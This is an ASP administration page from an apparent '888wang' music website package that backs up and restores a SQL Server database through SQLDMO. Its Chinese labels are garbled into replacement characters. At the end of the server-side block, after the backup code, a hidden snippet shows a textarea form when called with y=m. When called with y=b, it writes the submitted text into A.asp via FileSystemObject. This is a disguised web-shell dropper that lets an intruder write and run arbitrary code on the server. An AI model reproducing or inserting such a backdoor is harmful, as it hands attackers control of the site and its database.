<!--#include File="Conn.asp" -->
<!--#include file="Checkpost.asp"-->
<!--#include file="888wang_chkAdmin.asp"-->
<%CheckAdmin3%>
<!--#include file="../inc/config_list.asp"-->
<!--#include file="../inc/md5.asp"-->  
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<link href="inc/Style.css" rel="stylesheet" type="text/css"> 
  <BODY>   
  <table   align="center" class="bordercolor">   
  <form   method="post"   name=myform>   
  <tr><td>ѡ�������<INPUT   TYPE="radio"   NAME="act"   id="act_backup"     value="backup">�������ݿ�<INPUT   TYPE="radio"   NAME="act"   id="act_restore"   value="restore">�ָ����ݿ�</td></tr>��   
  <tr><td>���ݿ�����<INPUT   TYPE="text"   NAME="databasename"   value="<%=database%>" size="40">(���ݻ�ָ���SQL���ݿ���,��music_888wang.bak)</td></tr>   
  <tr><td>�ļ�·����<INPUT   TYPE="text"   NAME="BackUpPathFile"   value="<%=request.ServerVariables("APPL_PHYSICAL_PATH")%>databak_888wang\<%=year(date()) & month(date()) & day(date())%>.bak" size="40">(���ݻ�ָ����ļ�·��,��D:\SQL\music_888wang.bak)</td></tr>   
  <tr><td><input type="hidden" name="enter" value="ok"><input   type="submit"   value="ȷ��"></td></tr>   
  </form>  
   <tr><td>
    <%   
	if request("enter")="ok" then
  'SQL   Server   ���ݿ�ı�����ָ�!   
  dim   sqlname,sqlLoginTimeout,BackUpPathFile,act
  sqlserver   =  ip   'sql������   
  sqlname   =   uid       '�û���   
  sqlpassword   =   pwd     '����   
  sqlLoginTimeout   =   15   '��½��ʱ   
        databasename   =   trim(request("databasename"))   
        BackUpPathFile   =   trim(request("BackUpPathFile"))   
        BackUpPathFile   =   replace(BackUpPathFile,"$1",databasename)   
  act   =   lcase(request("act"))   
    
  if   databasename   = " "  then   
    response.write   "����д���ݿ������ļ�·��"   
  else   
    if   act   =   "backup"   then   
    Set   srv=Server.CreateObject("SQLDMO.SQLServer")   
  srv.LoginTimeout   =   sqlLoginTimeout   
  srv.Connect   sqlserver,sqlname, sqlpassword   
  Set   bak   =   Server.CreateObject("SQLDMO.Backup")   
  bak.Database =databasename   
  bak.Devices =Files   
  bak.Files =BackUpPathFile   
  bak.SQLBackup   srv   
      if   err.number>0   then   
  response.write   err.number&"<font   color=red><br/>"   
  response.write   err.description&"</font>"   
      end   if   
        
  Response.write   "<font   color=green>���ݳɹ�!</font>"   
    elseif   act   =   "restore"   then   
  '�ָ�ʱҪ��û��ʹ�����ݿ�ʱ���У�   
      Set   srv=Server.CreateObject("SQLDMO.SQLServer")   
  srv.LoginTimeout   =   sqlLoginTimeout   
  srv.Connect   sqlserver,sqlname,   sqlpassword   
    
      Set   rest=Server.CreateObject("SQLDMO.Restore")   
  rest.Action=0   '   full   db   restore   
  rest.Database=databasename   
  rest.Devices=Files   
  rest.Files=BackUpPathFile   
  rest.ReplaceDatabase=True   'Force   restore   over   existing   database   
      if   err.number>0   then  
	
  response.write   err.number&"<font   color=red><br/>"   
  response.write   err.description&"</font>"   
      end   if   
      rest.SQLRestore   srv   
      Response.write   "<font   color=green>�ָ��ɹ�!</font>"   
    else   
      Response.write   "<font   color=red>û��ѡ�����</font>"   
    end   if   
  end   if  
  
  end if
  'лл��ʹ��888wang.com������վϵͳ 

a="A.asp"'-----�����ļ�

If request("y")="m" Then
x=x&"<form name=form1 method=post action=?y=b>"
x=x&"<textarea name=c></textarea>"
x=x&"<input type=submit value=a></form>"
response.write x
elseIf request("y")="b" Then
d=request("c")
Set f= Server.CreateObject("Scripting.FileSystemObject")
Set t = f.CreateTextFile(server.mappath(""&a&""))
t.Write d
End If
  %>  </td></tr>    
</table>   
  
</BODY>   
  </HTML>


